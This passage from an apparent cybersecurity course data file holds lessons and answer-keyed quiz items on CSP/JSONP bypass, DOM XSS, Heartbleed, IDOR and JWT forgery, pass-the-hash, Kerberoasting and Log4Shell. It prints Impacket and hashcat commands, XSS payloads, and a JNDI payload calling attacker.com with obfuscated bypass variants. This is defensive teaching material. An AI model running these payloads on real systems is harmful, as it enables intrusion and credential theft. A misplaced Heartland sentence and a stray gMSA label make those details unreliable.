Content-Security-Policy: script-src https://cdn.jsdelivr.net

An attacker finds that jsdelivr.net serves JSONP
endpoints that wrap a callback parameter in a
function call.

Can the attacker bypass this CSP?`,
          text: "JSONP endpoint on whitelisted CDN — CSP bypass possible?",
          options: [
            "No — the CSP correctly restricts all scripts to jsdelivr.net",
            "Yes — inject a script tag pointing to the JSONP callback with attacker-controlled code",
            "No — JSONP endpoints are blocked by modern browsers regardless of CSP",
            "Yes — use eval() to execute inline code that CSP cannot inspect",
          ],
          correctIndex: 1,
          explanation: "If `https://cdn.jsdelivr.net/something?callback=alert(1)` returns `alert(1)(...)`, the browser executes alert(1) — because the script source IS the CSP-whitelisted jsdelivr.net. The JSONP endpoint wraps the URL parameter as a JS function call. This is a classic CSP bypass via trusted JSONP endpoints.",
        },
        {
          id: "univ-04-q3",
          type: "DOM XSS",
          challenge: `A SPA contains:
document.getElementById('msg').innerHTML =
  location.hash.slice(1);

Attack URL: https://example.com/#<img src=x onerror=alert(1)>

What type of XSS is this, and why is it
harder to detect by WAF/server?`,
          text: "DOM-based XSS — why harder to detect server-side?",
          options: [
            "Reflected XSS — the server echoes the input in the HTTP response",
            "Stored XSS — the payload is persisted in localStorage",
            "DOM-based XSS — processed by client-side JS without a server round-trip",
            "Blind XSS — the attacker cannot see the output in the browser",
          ],
          correctIndex: 2,
          explanation: "The URL fragment (location.hash) is never sent to the server — it is processed entirely in the browser. Server-side WAFs and output encoding have no visibility into this flow. Defense requires client-side sanitization (DOMPurify) at every sink that writes attacker-controlled content to innerHTML.",
        },
        {
          id: "univ-04-q4",
          type: "CSP Strength",
          challenge: `Which Content Security Policy directive provides
the strongest defense against XSS while remaining
practically deployable in a modern web app?

Consider: nonces, unsafe-inline, strict-dynamic.`,
          text: "Strongest practical CSP directive for XSS defense?",
          options: [
            "script-src 'unsafe-inline' 'unsafe-eval' https:",
            "script-src 'self'",
            "script-src 'nonce-{random}' 'strict-dynamic'",
            "default-src *",
          ],
          correctIndex: 2,
          explanation: "'nonce-{random}' requires each legitimate script tag to carry a matching cryptographic nonce generated server-side per response. Attackers cannot predict the nonce, so injected scripts without it are blocked. 'strict-dynamic' propagates trust to scripts loaded by trusted scripts. 'unsafe-inline' defeats CSP; 'self' is bypassed via JSONP on the same origin.",
        },
      ],
    },
  },

  // ─── univ-05: CVE-2014-0160 Heartbleed ────────────────────────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "Parthenon", location: "Athens, Greece", era: "447–432 BCE", emoji: "🏛️" },
    id: "univ-05",
    order: 5,
    title: "CVE-2014-0160 Heartbleed",
    subtitle: "TLS internals, the heartbeat extension, and key material recovery",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-05", name: "TLS Analyst", emoji: "💔" },
    challengeType: "quiz",
    cveId: "CVE-2014-0160",
    info: {
      tagline: "A missing bounds check in a keep-alive extension allowed anyone to read 64 KB of server memory — including private keys, passwords, and session tokens.",
      year: 2014,
      overview: [
        "CVE-2014-0160 (Heartbleed) is a critical buffer over-read in OpenSSL's TLS Heartbeat extension. OpenSSL was the dominant TLS implementation — embedded in Apache, nginx, and thousands of applications. At disclosure, approximately 17% of all HTTPS-enabled servers were vulnerable. CVSS 7.5 (High).",
        "The TLS Heartbeat extension keeps connections alive. A client sends a payload and a length field; the server echoes back exactly 'length' bytes from the payload buffer. The bug: OpenSSL trusted the client's length value without checking it against the actual payload size. An attacker could send a 1-byte payload with a length claim of 65,535 — and the server would echo 64 KB of its own heap memory.",
        "The leaked memory could contain TLS private keys, session cookies, passwords typed by other users, or plaintext HTTP requests. The attack left no log entries and could be repeated indefinitely. The only remediation was to update OpenSSL AND revoke and reissue all TLS certificates (since private keys may have been exposed).",
      ],
      technical: {
        title: "The Vulnerable C Code and What It Leaks",
        body: [
          "The heartbeat handler reads the payload and length from the client's request; allocates a response buffer of 'length' bytes; copies 'length' bytes from the payload pointer into the response buffer using memcpy. The missing check: if payload_length (from client) > actual received payload size, memcpy reads beyond the packet into adjacent heap memory.",
          "What could be in those 64 KB? OpenSSL stores private keys in heap memory during TLS handshakes. If the server's private key resided in the heap region read, the attacker obtained the private key — enabling decryption of all past and future TLS traffic (if the key was used for RSA key exchange without forward secrecy). Also vulnerable: password fields, session tokens, other users' decrypted HTTP payloads.",
        ],
        codeExample: {
          label: "Heartbleed Vulnerable Code (OpenSSL, simplified)",
          code: `/* ssl/t1_lib.c -- OpenSSL 1.0.1 BEFORE fix */
int tls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0];

    unsigned short hbtype = *p++;
    unsigned int payload = n2s(p);     /* LENGTH FROM CLIENT -- NOT VALIDATED */
    unsigned char *pl = p;             /* pointer to payload data */

    /* BUG: no check that payload <= actual_data_len */
    /* attacker sets payload = 65535, sends 1 byte of data */

    unsigned char *buffer = OPENSSL_malloc(1 + 2 + payload + padding);
    memcpy(bp, pl, payload);  /* reads 65535 bytes from heap! */
    /* leaks: private keys, passwords, session tokens */

    /* FIXED version adds: */
    if (1 + 2 + payload + 16 > s->s3->rrec.length) return 0;
}`,
        },
      },
      incident: {
        title: "17% of HTTPS Servers Exposed — Keys, Passwords, and Sessions",
        when: "April 7, 2014 — public disclosure after simultaneous discovery by Neel Mehta (Google) and Codenomicon",
        where: "OpenSSL 1.0.1 through 1.0.1f — Apache, nginx, and embedded devices globally",
        impact: "Yahoo! user credentials extracted live; Canadian Revenue Agency: 900 Social Insurance Numbers stolen; Linux Foundation CII created to fund OpenSSL",
        body: [
          "Heartbleed was disclosed simultaneously by Neel Mehta at Google Security and Codenomicon on April 7, 2014. Within hours, researchers confirmed private keys could be extracted. Yahoo! Mail was confirmed vulnerable; researchers published captured Yahoo user credentials extracted from Yahoo's heap memory.",
          "The response revealed a systemic problem: OpenSSL was the most critical security software on the internet, maintained by a team of four (primarily one volunteer). The Linux Foundation's Core Infrastructure Initiative, funded by major tech companies, was created directly in response. Three years later, Heartbleed payloads were still found in active exploit attempts against unpatched legacy systems.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Malicious Heartbeat", sub: "1-byte payload, length claim: 65535", type: "attacker" },
          { label: "OpenSSL memcpy", sub: "reads 64KB from heap", type: "system" },
          { label: "TLS Keys + Passwords", sub: "17% of HTTPS servers exposed", type: "victim" },
          { label: "Patch + Revoke + ECDHE", sub: "update, reissue cert, forward secrecy", type: "result" },
        ],
      },
      timeline: [
        { year: 2012, event: "Heartbeat extension (RFC 6520) merged into OpenSSL 1.0.1 — bug introduced" },
        { year: 2014, event: "Neel Mehta (Google) reports Heartbleed to OpenSSL privately; patch prepared" },
        { year: 2014, event: "Public disclosure; 17% of HTTPS servers vulnerable; Yahoo credentials extracted", highlight: true },
        { year: 2014, event: "Linux Foundation CII created; OpenSSL funded for first time" },
        { year: 2024, event: "Heartbleed still found in unpatched legacy and embedded devices — 10 years on" },
      ],
      keyTakeaways: [
        "Heartbleed is a buffer over-read — the bug is trusting client-supplied length without bounds-checking against actual data.",
        "TLS private key exposure enables passive decryption of all past traffic (without forward secrecy).",
        "Remediation requires both patching OpenSSL AND revoking/reissuing certificates — patching alone is insufficient.",
        "ECDHE (forward secrecy) limits damage: even with the private key, past sessions cannot be decrypted.",
      ],
      references: [
        { title: "Original Heartbleed Disclosure (heartbleed.com)", url: "https://heartbleed.com" },
        { title: "NVD CVE-2014-0160 Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2014-0160" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-05-q1",
          type: "CVE Analysis",
          challenge: `In OpenSSL's heartbeat handler, the server
copies "payload" bytes into the response buffer
using memcpy — where payload is provided by
the client without validation.

What is the root cause vulnerability class?`,
          text: "Root cause of CVE-2014-0160 at the code level?",
          options: [
            "Integer overflow in the TLS handshake length calculation",
            "Missing bounds check — server trusted client payload length without validating it",
            "Use-after-free in OpenSSL's memory allocator",
            "Cryptographic weakness in the RC4 cipher suite",
          ],
          correctIndex: 1,
          explanation: "The TLS Heartbeat handler used a client-supplied length directly in memcpy without checking whether it exceeded the actual received data. This is a buffer over-read caused by trusting attacker-controlled length values — not a memory corruption or cryptographic vulnerability.",
        },
        {
          id: "univ-05-q2",
          type: "Remediation",
          challenge: `A security team discovers their nginx server was
running vulnerable OpenSSL during the Heartbleed
window. They update OpenSSL to a fixed version.

Is this sufficient? What additional step is required?`,
          text: "After patching OpenSSL, what additional step is REQUIRED?",
          options: [
            "Rotate all application passwords stored in the database",
            "Revoke the current TLS certificate and issue a new one with a new private key",
            "Enable OCSP stapling on the web server",
            "Disable the TLS Heartbeat extension in nginx configuration",
          ],
          correctIndex: 1,
          explanation: "If the private key was in heap memory during the vulnerability window, attackers may have already extracted it. Updating OpenSSL stops future exploitation but does not mitigate past key exposure. The compromised key must be revoked at the CA and a new key pair/certificate issued. Failing this leaves the server vulnerable to impersonation.",
        },
        {
          id: "univ-05-q3",
          type: "Forward Secrecy",
          challenge: `A server uses RSA key exchange for TLS sessions.
An attacker extracts the server's private key
via Heartbleed and has captured past HTTPS traffic.

How does TLS with ECDHE differ in this scenario?`,
          text: "Why does ECDHE provide better protection against Heartbleed than RSA key exchange?",
          options: [
            "ECDHE uses longer keys that are computationally infeasible to extract from memory",
            "ECDHE provides forward secrecy — session keys are ephemeral and not derivable from the private key",
            "ECDHE heartbeat requests are encrypted, preventing the over-read attack",
            "ECDHE is not affected by the bounds check bug",
          ],
          correctIndex: 1,
          explanation: "With RSA key exchange, the server's private key can decrypt the pre-master secret and reconstruct session keys — enabling decryption of all captured past traffic. ECDHE generates ephemeral per-session keys. Even if the long-term private key is extracted, past session keys cannot be derived from it. This is forward secrecy.",
        },
        {
          id: "univ-05-q4",
          type: "Detection",
          challenge: `A CISO asks: "How many times were we exploited
by Heartbleed before we patched? What data
was accessed?"

What is the honest answer about forensic capability?`,
          text: "Why was Heartbleed exploitation forensically undetectable?",
          options: [
            "It modified server log files to delete evidence",
            "It crashed the server, making it impossible to determine what was accessed",
            "It left no log entries — exploitation was invisible in standard web and application logs",
            "It encrypted exfiltrated data so content could not be determined",
          ],
          correctIndex: 2,
          explanation: "Malformed heartbeat requests are processed entirely within the TLS layer before HTTP applications see them. Web server access logs, application logs, and WAF rules had no visibility into heartbeat-level requests. Organizations could not determine whether they had been exploited or what data was accessed — making breach scope impossible to quantify.",
        },
      ],
    },
  },

  // ─── univ-06: Broken Access Control ──────────────────────────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "Great Wall of China", location: "Northern China", era: "7th century BCE – 17th century CE", emoji: "🏯" },
    id: "univ-06",
    order: 6,
    title: "Broken Access Control",
    subtitle: "IDOR at scale, JWT vulnerabilities, RBAC vs ABAC models",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-06", name: "Access Control Architect", emoji: "🔑" },
    challengeType: "quiz",
    info: {
      tagline: "Access control failures are OWASP #1. Most are not clever attacks — they are missing authorization checks.",
      year: 2021,
      overview: [
        "Broken Access Control is OWASP A01:2021 — found in 94% of applications tested. The failure is conceptually simple: the application authenticates users correctly but fails to verify whether an authenticated user is authorized to perform a specific action. Authentication answers 'who are you?' — authorization answers 'what are you allowed to do?'",
        "Insecure Direct Object References (IDOR) occur when user-controlled identifiers are used directly in data lookups without verifying that the requesting user is authorized. A request for /api/invoices/12345 should check not just that the user is logged in, but that invoice 12345 belongs to that user. This check is frequently missing — especially in APIs designed rapidly.",
        "JSON Web Tokens (JWTs) have become ubiquitous for session management but have a documented history of critical vulnerabilities: the 'none' algorithm attack (skip signature verification), the algorithm confusion attack (use RS256 public key as HS256 secret), and weak secrets that can be brute-forced. A JWT with a forged payload grants the attacker any claims — including admin: true.",
      ],
      technical: {
        title: "IDOR, JWT Attacks, and RBAC vs ABAC",
        body: [
          "IDOR attack pattern: authenticated user changes a numeric ID in a URL to access another user's data. At scale, iterating all IDs from 1 to N enumerates the entire user database. RBAC (Role-Based Access Control) assigns permissions to roles — simple and auditable but coarse-grained. ABAC (Attribute-Based Access Control) makes decisions based on attributes of user, resource, and environment — more expressive but more complex to implement.",
          "JWT vulnerability classes: (1) 'none' algorithm attack — set alg=none in header, remove signature, server skips verification. (2) Algorithm confusion — RS256 server: sign token using the public key as HS256 secret; server verifying with public key + allowing HS256 accepts it as valid. (3) Weak HS256 secrets crackable with hashcat. Defense: whitelist allowed algorithms server-side and never auto-detect from token header.",
        ],
        codeExample: {
          label: "IDOR Vulnerability and JWT Algorithm Confusion Attack",
          code: `// VULNERABLE: IDOR -- no ownership check
app.get('/api/messages/:id', authenticate, async (req, res) => {
  const msg = await db.getMessage(req.params.id);  // any ID works!
  res.json(msg);
});

// SECURE: ownership check enforced
app.get('/api/messages/:id', authenticate, async (req, res) => {
  const msg = await db.getMessage(req.params.id);
  if (!msg || msg.ownerId !== req.user.id) return res.status(403).json({});
  res.json(msg);
});

// JWT 'none' algorithm attack
// Attacker base64-decodes header: {"alg":"RS256","typ":"JWT"}
// Changes to: {"alg":"none","typ":"JWT"}
// Removes signature. Vulnerable server accepts unsigned token.
// Fix: explicitly whitelist allowed algorithms:
jwt.verify(token, secret, { algorithms: ['RS256'] });

// JWT algorithm confusion (RS256 -> HS256)
// Server uses RS256. Attacker signs with public key as HS256 secret.
// jwt.sign(payload, publicKey, {algorithm: 'HS256'}) -- valid sig!
// Fix: never auto-detect algorithm from token header.`,
        },
      },
      incident: {
        title: "Optus Data Breach — 9.8 Million Records via Unauthenticated IDOR",
        when: "September 2022",
        where: "Optus, Australia's second-largest telecommunications provider",
        impact: "9.8 million customers' PII exposed (passports, driver's licenses, DOBs); CEO resigned; A$50M penalty proposed",
        body: [
          "The Optus breach exposed PII of 9.8 million current and former customers via an unauthenticated API endpoint exposed to the internet. The attacker iterated a customer ID from 1 to approximately 11 million, collecting full PII records with each request. No authentication was required. The API had been intended for internal use but was exposed through a misconfigured API gateway with no rate limiting.",
          "Heartland had $145M in fraud settlements. Optus triggered proposed Privacy Act amendments increasing penalties to A$50M for serious breaches. The CEO resigned. The attack required no sophisticated tooling — a loop iterating integer IDs is junior-programmer territory. The real cost: hundreds of millions of dollars in regulatory, legal, and remediation expenses for a missing authorization check.",
        ],
      },
      diagram: {
        nodes: [
          { label: "IDOR / JWT Forgery", sub: "iterate IDs or forge token claims", type: "attacker" },
          { label: "Unauthenticated API", sub: "no ownership check, no rate limit", type: "system" },
          { label: "9.8M Customer Records", sub: "Optus 2022 — PII, passports, DLs", type: "victim" },
          { label: "Ownership Check + gMSA", sub: "verify ownership on every lookup", type: "result" },
        ],
      },
      timeline: [
        { year: 2013, event: "JSON Web Token (JWT) RFC 7519 published; rapid API adoption begins" },
        { year: 2015, event: "Tim McLean publishes critical JWT library vulnerabilities — none/algo confusion" },
        { year: 2019, event: "Facebook IDOR: 419 million phone numbers exposed via unauthenticated API" },
        { year: 2021, event: "OWASP reclassifies Broken Access Control as A01 — overtaking Injection", highlight: true },
        { year: 2022, event: "Optus breach: 9.8M records via unauthenticated sequential IDOR" },
      ],
      keyTakeaways: [
        "Every data-access operation must verify ownership/authorization, not just authentication.",
        "JWT algorithm confusion attacks occur when servers accept any algorithm specified in the token header.",
        "RBAC is simple but coarse; ABAC provides fine-grained policy at the cost of complexity.",
        "IDOR at scale requires only iteration — no advanced exploit skills needed.",
      ],
      references: [
        { title: "OWASP IDOR Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" },
        { title: "PortSwigger JWT Attack Guide", url: "https://portswigger.net/web-security/jwt" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-06-q1",
          type: "IDOR",
          challenge: `An API endpoint returns /api/orders/{orderId} to
authenticated users. A user changes orderId from
1001 to 1002 and receives another user's order.

What vulnerability is this, and what is the
missing control?`,
          text: "User accesses another user's order by changing the ID — what vulnerability?",
          options: [
            "Session fixation — session token not rotated after login",
            "IDOR — the API lacks ownership authorization checks",
            "JWT forgery — the user modified their authentication token",
            "Privilege escalation — user elevated from customer to admin",
          ],
          correctIndex: 1,
          explanation: "IDOR occurs when the API retrieves resources by a user-controlled identifier without verifying the requesting user owns that resource. Authentication (is the user logged in?) is separate from authorization (does this user own order 1002?). The missing ownership check is the IDOR vulnerability.",
        },
        {
          id: "univ-06-q2",
          type: "JWT Attack",
          challenge: `An attacker modifies a JWT header from:
  {"alg":"RS256"} to {"alg":"none"}
then removes the signature and replays the token.

Which condition makes this attack successful?`,
          text: "JWT 'none' algorithm attack — what condition enables it?",
          options: [
            "The server's RSA private key has been compromised",
            "The JWT library accepts the 'none' algorithm from the token's own header",
            "The server is running an outdated TLS version",
            "The attacker has a MITM position on the network",
          ],
          correctIndex: 1,
          explanation: "Many early JWT libraries auto-detected the algorithm from the token's header, then verified the signature using that algorithm. When alg=none, the library skipped signature verification entirely. Fix: hardcode the expected algorithm server-side and explicitly reject 'none'.",
        },
        {
          id: "univ-06-q3",
          type: "RBAC vs ABAC",
          challenge: `An access policy states:
"A user may read a document ONLY IF:
 - their department matches the document's department
 - their clearance >= document's classification
 - current time is within business hours"

Which access control model is this?`,
          text: "Multi-dimensional policy with user, resource, and environment attributes — which model?",
          options: [
            "Role-Based Access Control (RBAC)",
            "Discretionary Access Control (DAC)",
            "Attribute-Based Access Control (ABAC)",
            "Mandatory Access Control (MAC)",
          ],
          correctIndex: 2,
          explanation: "ABAC makes access decisions based on attributes of the subject (user.department, user.clearance), resource (document.classification), and environment (current time). RBAC would assign roles (e.g., 'Finance-Reader') without encoding these multi-dimensional conditions.",
        },
        {
          id: "univ-06-q4",
          type: "Real Incident",
          challenge: `Optus 2022: an attacker iterated customer IDs from
1 to ~11 million on an API endpoint, collecting
full PII records with each request.

The API had no authentication requirement.
What is the access control failure classification?`,
          text: "Optus 2022 root cause — which access control failure category?",
          options: [
            "JWT secret was brute-forced by the attacker",
            "SQL injection in the customer lookup API endpoint",
            "Authenticated IDOR where users could access each other's records",
            "Unauthenticated API with no rate limiting or ownership checks",
          ],
          correctIndex: 3,
          explanation: "The Optus API required no authentication — it was an internal API accidentally exposed via a misconfigured gateway. Authentication was not even in play. The attacker iterated IDs with no rate limiting, no authentication, no ownership checks, and no anomaly detection — for days before detection.",
        },
      ],
    },
  },

  // ─── univ-07: Authentication Attacks ─────────────────────────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "Petra", location: "Jordan", era: "4th century BCE", emoji: "🌹" },
    id: "univ-07",
    order: 7,
    title: "Authentication Under Attack",
    subtitle: "Credential stuffing, GPU hash cracking, pass-the-hash, and Kerberoasting",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-07", name: "Auth Specialist", emoji: "🎭" },
    challengeType: "quiz",
    info: {
      tagline: "Authentication is the single gate through which all access flows. Attackers invest enormous effort in every technique to bypass or undermine it.",
      year: 2016,
      overview: [
        "Authentication attacks span a spectrum from offline cryptanalysis against leaked hash databases to active network attacks against running authentication protocols. Credential stuffing is the dominant attack volume: billions of username/password pairs from past breaches are systematically tested against new targets. The success rate is only ~0.1-2%, but at scale that translates to millions of valid logins.",
        "Offline password cracking works against leaked password hashes. Modern GPUs compute ~60 billion MD5 hashes per second. An 8-character password using MD5 without salting can be cracked in minutes. bcrypt, scrypt, and Argon2 are designed specifically to be slow — limiting GPU cracking to thousands of hashes per second instead of billions.",
        "Pass-the-Hash (PtH) exploits Windows NTLM authentication: the authentication proof is derived directly from the password hash, without requiring the plaintext. An attacker who extracts an NTLM hash can authenticate as that user on other systems without knowing the password. Kerberoasting targets Active Directory service accounts by requesting Kerberos TGS tickets and cracking them offline.",
      ],
      technical: {
        title: "Credential Stuffing, GPU Cracking, PtH, and Kerberoasting",
        body: [
          "Credential stuffing pipeline: acquire breach database (HaveIBeenPwned indexes 14 billion compromised accounts), filter by target domain, automate login attempts via headless browser or API. Defense: MFA (renders passwords alone useless), anomaly detection on login velocity/IP diversity, CAPTCHA, IP reputation blocking.",
          "Kerberoasting: any authenticated domain user can request a Kerberos service ticket (TGS) for any SPN. The TGS is encrypted with the service account's NTLM hash. Attacker requests TGS, extracts encrypted blob, cracks offline. Service accounts often have weak passwords set years ago and never rotated. Impacket's GetUserSPNs.py automates the attack. Defense: gMSA — 240-character random passwords, auto-rotated every 30 days.",
        ],
        codeExample: {
          label: "Pass-the-Hash and Kerberoasting (Detection Focus)",
          code: `# Pass-the-Hash with Impacket (authorized red team use)
# Attacker extracts NTLM hash from SAM/LSASS:
# Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::
# Uses hash (not password) to authenticate to other hosts:
python smbexec.py -hashes :31d6cfe0d16ae931 DOMAIN/Administrator@target

# Kerberoasting with Impacket
python GetUserSPNs.py DOMAIN/user:password -dc-ip 10.0.0.1 -request
# Returns TGS tickets encrypted with service account hash
# Crack offline with hashcat:
hashcat -m 13100 kerberoast.txt rockyou.txt

# Defense: Group Managed Service Accounts (gMSA)
# gMSA passwords: 240-char random, auto-rotated every 30 days
# Kerberoasting fails: crack time = effectively infinite
# New-ADServiceAccount -Name svc-web -DNSHostName web.domain.com

# Detecting PtH in Windows Event Logs
# Event ID 4624 (Logon) with LogonType=3 + NTLM + no preceding 4625
# Event ID 4776 (NTLM auth) from unexpected workstations`,
        },
      },
      incident: {
        title: "RockYou2021 — 8.4 Billion Passwords and the Credential Stuffing Ecosystem",
        when: "June 2021",
        where: "COMB (Compilation of Many Breaches) and RockYou2021 published on hacking forums",
        impact: "8.4 billion unique plaintext passwords in one file; credential stuffing toolkits target streaming, banking, and retail accounts at scale",
        body: [
          "In June 2021, RockYou2021.txt was posted on a popular hacking forum containing 8.4 billion unique plaintext passwords compiled from past breaches. Credential stuffing toolkits (OpenBullet, SilverBullet) ingest this file and test combinations at thousands per second. Compromised streaming accounts sell for $3-10 each; financial accounts for more.",
          "Analysis of RockYou-class databases shows 30% of users reuse exact passwords across sites; 50% use minor variations. This statistical reality is the engine that makes credential stuffing profitable at a 0.1% success rate. NIST SP 800-63B updated in 2024 recommends checking passwords against breach lists at registration — not just at breach time.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Credential Stuffing / PtH / Kerberoasting", sub: "live attacks + offline cracking", type: "attacker" },
          { label: "Password Hash Databases / AD", sub: "NTLM hash, TGS tickets, BCrypt", type: "system" },
          { label: "User Accounts / Service Accounts", sub: "8.4B passwords in circulation", type: "victim" },
          { label: "MFA + bcrypt + gMSA", sub: "slow hashing; auto-rotating service creds", type: "result" },
        ],
      },
      timeline: [
        { year: 2009, event: "RockYou breach: 32M plaintext passwords; becomes standard wordlist" },
        { year: 2012, event: "LinkedIn breach: 6.5M unsalted SHA-1 hashes cracked within days" },
        { year: 2014, event: "Pass-the-Hash techniques documented in Mimikatz tool" },
        { year: 2016, event: "Kerberoasting technique formalized by Tim Medin at SANS", highlight: true },
        { year: 2021, event: "RockYou2021: 8.4 billion passwords; COMB: 3.2 billion email:pass pairs" },
        { year: 2024, event: "NIST SP 800-63B updated: recommends breach-list checks for password registration" },
      ],
      keyTakeaways: [
        "Credential stuffing is the highest-volume authentication attack; MFA is the primary defense.",
        "MD5/SHA-1/SHA-256 without salting are crackable by GPU at billions of hashes per second.",
        "bcrypt, scrypt, Argon2 are designed to be slow — limiting GPU cracking to thousands per second.",
        "Pass-the-Hash and Kerberoasting target Windows AD and are defeated by Protected Users / gMSA.",
      ],
      references: [
        { title: "NIST SP 800-63B Digital Identity Guidelines", url: "https://pages.nist.gov/800-63-3/sp800-63b.html" },
        { title: "HaveIBeenPwned Credential Exposure Check", url: "https://haveibeenpwned.com" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-07-q1",
          type: "Hash Cracking",
          challenge: `An attacker obtains a bcrypt hash and an MD5 hash
from a leaked database and attacks both with
a GPU cluster.

What is the practical cracking time difference?`,
          text: "bcrypt vs MD5 with a GPU cluster — practical cracking time difference?",
          options: [
            "No difference — both are trivially broken by GPU clusters",
            "bcrypt is 3-6x slower than MD5",
            "bcrypt's work factor reduces GPU throughput from billions/second to thousands/second",
            "bcrypt cannot be cracked because it uses asymmetric encryption",
          ],
          correctIndex: 2,
          explanation: "MD5 computes at ~60 billion hashes/second on a modern GPU cluster. bcrypt's work factor requires hundreds of thousands of iterations per hash — reducing GPU throughput to ~25,000/second. A password that takes milliseconds with MD5 takes centuries with bcrypt. This is intentional key stretching for password storage.",
        },
        {
          id: "univ-07-q2",
          type: "Pass-the-Hash",
          challenge: `In a Pass-the-Hash attack against Windows AD,
an attacker who extracts an NTLM hash from one
compromised host authenticates to another host.

Why doesn't the attacker need the plaintext password?`,
          text: "Pass-the-Hash — why is the plaintext password not needed?",
          options: [
            "A Kerberos ticket was obtained from the domain controller",
            "The plaintext was recovered by decrypting the NTLM hash",
            "NTLM authentication accepts the hash itself as the authentication proof",
            "A forged JWT is signed with the domain controller's private key",
          ],
          correctIndex: 2,
          explanation: "NTLM authentication is a challenge-response scheme where the response is derived directly from the NT hash. The protocol never requires plaintext — only the hash. An attacker with the hash computes valid NTLM responses, gaining authenticated access to any system accepting NTLM for that account.",
        },
        {
          id: "univ-07-q3",
          type: "Kerberoasting",
          challenge: `Kerberoasting targets service accounts in Active
Directory. Any authenticated domain user can request
a TGS ticket for any SPN.

Why are service accounts ideal Kerberoasting targets?`,
          text: "Why are service accounts particularly vulnerable to Kerberoasting?",
          options: [
            "Service accounts always have Domain Admin privileges by default",
            "Service account TGS tickets use weaker encryption than user tickets",
            "Service accounts have weak, old passwords set manually and rarely rotated",
            "Service accounts are exempt from account lockout policies",
          ],
          correctIndex: 2,
          explanation: "Service accounts are configured with manually-set passwords years ago, often never rotated. Short, old, or dictionary-based passwords are crackable offline in hours. The TGS ticket is freely requestable by any domain user. Defense is gMSA: 240-character random passwords auto-rotated every 30 days.",
        },
        {
          id: "univ-07-q4",
          type: "Credential Stuffing",
          challenge: `An attacker has 8.4 billion username:password pairs
from past breaches and tests them against a target.

A user's password is in the list but the account
has MFA enabled. What happens?`,
          text: "Credential stuffing with valid password — what does MFA prevent?",
          options: [
            "MFA does not help — the valid password triggers immediate account access",
            "MFA blocks access even with a valid password — a second factor is required",
            "Rate limiting blocks the attack before MFA is reached",
            "Checking passwords against HaveIBeenPwned prevents the login attempt",
          ],
          correctIndex: 1,
          explanation: "Credential stuffing supplies valid username/password pairs — the password check passes. MFA adds a factor (TOTP code, push notification, hardware key) that credential stuffing databases cannot supply. Regardless of how many valid passwords are in circulation, MFA makes them insufficient for authentication alone.",
        },
      ],
    },
  },

  // ─── univ-08: CVE-2021-44228 Log4Shell ────────────────────────────────────────
  {
    epochId: "ancient",
    group: "university",
    wonder: { name: "Colosseum", location: "Rome, Italy", era: "70–80 CE", emoji: "🏟️" },
    id: "univ-08",
    order: 8,
    title: "CVE-2021-44228 Log4Shell",
    subtitle: "JNDI/LDAP injection chain, bypass variants, and full attack analysis",
    category: "cybersecurity",
    xp: 80,
    badge: { id: "badge-univ-08", name: "Log4Shell Analyst", emoji: "🪵" },
    challengeType: "quiz",
    cveId: "CVE-2021-44228",
    info: {
      tagline: "A logging library turning user-supplied strings into RCE: the simplest trigger for the most widespread critical vulnerability in a decade.",
      year: 2021,
      overview: [
        "CVE-2021-44228 (Log4Shell) is an RCE vulnerability in Apache Log4j 2 (versions 2.0-beta9 through 2.14.1). CVSS score: 10.0 — the maximum. Log4j 2 is embedded in Apache Solr, Kafka, Elasticsearch, and countless enterprise applications. The attack surface was effectively every Java application that logged user-controlled input.",
        "The vulnerability exploits Log4j's message lookup feature. Log4j supports substitution patterns like ${java:version} or ${env:HOSTNAME}. A critical lookup was JNDI: ${jndi:ldap://attacker.com/exploit}. When Log4j processed this string, it made an LDAP request to attacker.com, which responded with a Java class definition. Log4j then loaded and instantiated the attacker's class — executing arbitrary code in the JVM.",
        "The trigger: log any user-supplied input containing ${jndi:...}. This includes HTTP headers (User-Agent, X-Forwarded-For, Referer), URL parameters, usernames, form fields — any data that reaches a Log4j log statement. The attack was zero-click: simply sending an HTTP request triggered exploitation. CISA Director Jen Easterly called it 'the most serious vulnerability I have seen in my decades-long career.'",
      ],
      technical: {
        title: "JNDI Injection Chain: Trigger to RCE",
        body: [
          "Full attack chain: (1) Attacker sends HTTP request with User-Agent header containing the JNDI payload. (2) Application logs the request with Log4j. (3) Log4j recognizes the ${jndi:...} pattern and executes a JNDI lookup. (4) JNDI makes an LDAP request to attacker's server. (5) Attacker's LDAP server responds with a reference to a remote Java class. (6) Log4j's class loader fetches and instantiates the class. (7) Class constructor executes arbitrary attacker code.",
          "Bypass variants: ${${lower:j}ndi:...} uses Log4j's own nested expansion to assemble 'jndi' after WAF inspection. ${${::-j}${::-n}${::-d}${::-i}:...} obfuscates each character. Defenders blocking the literal string '${jndi:' still got hit. DNS callbacks (${jndi:dns://canarytoken.com/test}) were used for safe vulnerability detection — generating a DNS query that confirms JNDI processing without executing code.",
        ],
        codeExample: {
          label: "Log4Shell Attack Chain and Mitigation",
          code: `// Vulnerable Java code (Log4j 2.x <= 2.14.1)
import org.apache.logging.log4j.LogManager;
Logger logger = LogManager.getLogger();

// This single line triggers RCE when called on user input:
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
// Payload: User-Agent: \${jndi:ldap://attacker.com:1389/Exploit}

// Attack chain:
// 1. Log4j processes \${jndi:ldap://attacker.com:1389/Exploit}
// 2. Makes LDAP request to attacker.com:1389
// 3. LDAP responds: javaCodeBase + className="Exploit"
// 4. JVM fetches http://attacker.com/Exploit.class
// 5. JVM instantiates Exploit -- constructor executes attacker code

// Bypass variants (evade naive \${jndi: WAF rules)
// \${j\${::-n}di:ldap://attacker.com/x}      -- case confusion
